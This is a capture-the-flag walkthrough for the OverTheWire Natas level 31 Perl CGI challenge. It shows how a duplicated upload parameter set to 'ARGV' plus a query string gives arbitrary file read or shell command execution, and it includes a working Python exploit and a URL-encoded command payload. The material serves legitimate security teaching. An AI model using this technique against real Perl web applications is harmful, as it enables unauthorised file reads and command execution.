> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas31.natas.labs.overthewire.org`                  |
| Username | `natas31`                                                    |
| Password | *found in [Natas Level 29 → 30](natas-level-29-level-30.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own Perl source
- **Python** — to craft the multipart request that injects `ARGV` as a filehandle

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas31.natas.labs.overthewire.org` and log in with the password from Level 30.

The page presents a CSV file upload form. Submitting a file displays its contents in a table. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
```

The script checks whether the `file` parameter is an uploaded file via `$cgi->upload('file')`, then reads the filename back with `$cgi->param('file')` and iterates over it with `while (<$file>)`. Each line is split on `,` and its fields are printed as table cells. The `<$file>` diamond operator reads lines from whatever filehandle `$file` names.

The vulnerability is in those three lines taken together.

---

### Understand `upload()` in List Context

`$cgi->upload('file')` in a boolean check returns truthy if any uploaded file exists for that parameter. It does not enforce that only one value for `file` exists.

From the CGI.pm documentation:

> In a list context, `upload()` will return an array of filehandles. This makes it possible to process forms that use the same name for multiple upload fields.

So `file` can appear more than once in the multipart request, once as a real uploaded file, and once as a plain text field with an arbitrary value. The `upload()` check passes as long as one of them is a real file. `param('file')` then returns a list of all values, and Perl's list-flattening assigns the **first** one to `$file`. If the plain text value comes first in the request, its string, not the real file's handle, is what `$file` holds.

---

### Understand the `ARGV` Filehandle

In Perl, `<>` (the diamond operator) with no explicit filehandle reads from `ARGV`. `ARGV` is a special global: Perl opens each element of `@ARGV` as a file in turn and streams their contents through `<>`. If `@ARGV` is empty, `<>` reads from stdin. If an element of `@ARGV` ends with `|`, Perl treats the whole string as a shell command and reads its output instead.

When the script does `while (<$file>)`, it is using the indirect filehandle form, `$file` names the filehandle to read from. If `$file` is the string `"ARGV"`, Perl resolves that to the `ARGV` handle and reads from `@ARGV`.

`@ARGV` in a CGI script is populated from the **query string**. Anything after `?` in the URL lands in `@ARGV`.

So: set `$file = "ARGV"` by putting `ARGV` first in the `file` parameter list, and set `@ARGV` to the path to read by putting that path in the query string. The `while (<$file>)` loop then reads that file and prints it.

---

### Step 3 — Construct the Payload

Two modifications to a normal upload request:

1. Add a plain `file` field with value `ARGV` **before** the real file in the multipart body. `param('file')` returns the list in submission order; the first value, `ARGV`, is assigned to `$file`.
2. Append the target file path to the URL as a query string: `?/etc/natas_webpass/natas32`.

The `upload()` check passes because a real file is present. `$file` is `"ARGV"`. `@ARGV` is `["/etc/natas_webpass/natas32"]`. The diamond operator opens that path and streams its contents into the response.

Append a command ending in `|` to the query string instead of a file path:

```
?cat /etc/natas_webpass/natas32 |
```

When an `@ARGV` element ends with `|`, Perl passes the string to the shell as a command and reads its stdout. URL-encode the spaces: `?cat%20/etc/natas_webpass/natas32%20|`.

Both approaches yield the password. The file-read path is simpler.

---

### Step 4 — Python Script

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas31", "<password>")
url  = "http://natas31.natas.labs.overthewire.org/index.pl"

response = requests.post(
    url + "?cat%20/etc/natas_webpass/natas32%20|",
    auth=auth,
    files=[
        ("file", ("dummy.csv", "a,b\n1,2\n")),   # real file — satisfies upload() check
    ],
    data={"file": "ARGV"},                         # plain field — comes first, so param('file') returns it first
)
print(response.text)
```

`requests` places `data` fields before `files` fields in the multipart body. `param('file')` returns `("ARGV", <filehandle>)` in that order; the first value, `"ARGV"`, is assigned to `$file`. The query string populates `@ARGV`. The shell executes `cat /etc/natas_webpass/natas32` and the output is printed in the response.

```bash
python3 natas31.py
```

That is the password for [Natas Level 31 → 32](natas-level-31-level-32.md).

---

## Key Takeaways

- **`upload()` checks presence, not exclusivity.** It passes as long as one `file` value is a real upload. A second plain-text `file` value alongside it is not rejected, and if it comes first, `param()` returns it first.
- **`param()` returns a list; scalar assignment takes only the first element.** The same list-flattening behaviour from Level 30 applies here. Code that calls `param()` in a scalar context silently discards all but the first submitted value, which the attacker controls by controlling submission order.
- **`ARGV` is a global filehandle that reads from the query string.** This is a Perl-specific idiom with no PHP equivalent. Passing `"ARGV"` as an indirect filehandle name hands the attacker arbitrary file read, or arbitrary command execution when `@ARGV` elements end with `|`.
- **The diamond operator's pipe syntax is the same vector as Level 29's `open()`.** Level 29 put `|command` into a filename passed to `open()`. Level 31 puts `command |` into `@ARGV` consumed by `<>`. Both exploit Perl's convention of treating a string ending or beginning with `|` as a shell command rather than a file path.

---